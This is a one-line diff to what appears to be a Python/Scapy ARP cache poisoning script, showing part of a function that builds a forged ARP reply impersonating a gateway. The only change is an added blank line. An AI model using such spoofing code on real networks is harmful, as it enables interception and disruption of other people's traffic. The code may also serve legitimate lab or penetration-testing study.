@@ -7,6 +7,7 @@ def poison(target_ip, spoof_ip):
     '''Change mac address in arp table'''
     # Get target host ip address using previously created function
     target_mac = get_target_mac(target_ip)
+
     # Create ARP packet. target_ip - target host ip address, spoof_ip - gateway ip address
     # op=2 means that ARP is going to send answer 
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
